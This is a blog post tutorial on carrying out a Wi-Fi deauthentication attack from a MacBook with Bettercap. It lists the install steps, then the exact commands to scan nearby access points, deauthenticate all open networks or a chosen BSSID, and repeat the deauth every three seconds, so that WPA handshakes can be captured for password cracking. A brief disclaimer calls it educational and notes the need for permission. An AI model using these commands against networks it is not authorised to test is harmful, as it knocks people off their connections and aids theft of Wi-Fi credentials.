---
published: true
layout: single
title: Hacking. Wi-Fi Deauthentification attack on MacOS
excerpt: >-
  Probably all Apple computers with wireless cards are capable to use monitoring and de-authentication mode. BetterCAP is an amazing, adaptable, and convenient tool made to perform a different type of WiFi attack.
categories: sysad
tags: wifi security linux macos
toc: true
# header:
#   teaser: /assets/images/selenium/selenium_python_logo.png
#   og_image: /assets/images/selenium/selenium_python_logo.png
---

> Disclaimer: this post for education purposes only.

Probably all Apple computers with wireless cards are capable to use monitoring and de-authentication mode. Please note that de-authentication it’s the same as a denial of service. It’s illegal in many places and you might get in trouble. So, make sure you have permission to do so.

Also, there is a native command-line tool, airport (and [this guide][part1] how to capture WPA with it).

In this write-up, I will focus on capturing WPA handshakes with MacBook and [Bettercap][bettercap].

## prerequisites

You need the [Homebrew](https://brew.sh/) package manager installed. If you don’t have it, use the one-liner below to install it. It will also install Xcode command line tools and all necessary dependencies. You will need to enter your administrator password and it will take up to 5 minutes:

```
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
```


## installation

Once you have Homebrew you proceed with the command below to install Bettercap:
```
brew install bettercap
```

## running

Now, we can run Bettercap to look at what is around us. Please note that as an interface adapter I am using a new MacBook Pro, which has the Wireless adapter as `en0`. In your case, it might be `en1`. Check yours here `🍎 > About this mac > System Report > Network > Wi-Fi):

1. Disassociate a network
```
sudo airport -z
```

2. Run bettercap
```
sudo bettercap -iface en0
```

3. Start discovering Access Points around you
```
wifi.recon on
```

After that you will sniff all traffic tranmitting around you:
[![bettercap-monitor]({{ site.baseurl }}/assets/images/wifi-crack/bettercap-monitor.png)]({{ site.baseurl }}/assets/images/wifi-crack/bettercap-monitor.png){: .align-center}

4. To see access points around you use the following command
```
wifi.show
```

[![wifi-show]({{ site.baseurl }}/assets/images/wifi-crack/wifi-show.png)]({{ site.baseurl }}/assets/images/wifi-crack/wifi-show.png){: .align-center}

5. Now, let’s send deauthentication packets to networks. `wifi.deauth` starts sending [deauth packets][deauth] to the specified (BSSID) of the access point

Open networks are those which aren’t protected by a passphrase.
```
set wifi.deauth.open true
wifi.deauth all
```

Or deauth only one Access Point with `11:11:11:11:11:11` BSSID
```
wifi.deauth 11:11:11:11:11:11
```

You can also to opt the broadcast to address `FF:FF:FF:FF:FF:FF`.

To repeat it every 3 seconds run this
```
set ticker.period 3
set ticker.commands wifi.deauth 11:11:11:11:11:11
ticker on
```

[![wifi-deauth]({{ site.baseurl }}/assets/images/wifi-crack/wifi-deauth.png)]({{ site.baseurl }}/assets/images/wifi-crack/wifi-deauth.png){: .align-center}

A client has reauthenticated after being deauthenticated by bettercap and a handshake can be captured to [hack password](part1) or smth.else.

## conclusion

Bettercap has many more functionalities that can be used in a network attack, monitoring, or testing process. These include password sniffer, fake access point creation, handshake capture, Wi-Fi networks monitoring, bettercap webserver, DNS spoofer, transparent HTTP proxy, TCP proxy, logging, and many more. In this article I would show the one aspect of the tool - deauthenticate clients from AP.

If you have any questions on any of the modules that bettercap offers I suggest you visit [bettercap.org](https://www.bettercap.org) and read the documentation.

## additional information

* [Youtube Video](https://www.youtube.com/watch?v=G6MXOzGIJZ4) - video example of hacking WiFi password
* [Issue in GitHub about kernel panic](https://github.com/bettercap/bettercap/issues/448) - some MacBooks has a problem to run bettercap
* [Wikipedia. Wi-Fi deauthentication attack](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) - some information about basic of attack

[bettercap]: https://www.bettercap.org/intro/
[part1]: {% post_url 2020-07-17-wifi-cracking.md %}
[deauth]: https://mrncciew.com/2014/10/11/802-11-mgmt-deauth-disassociation-frames/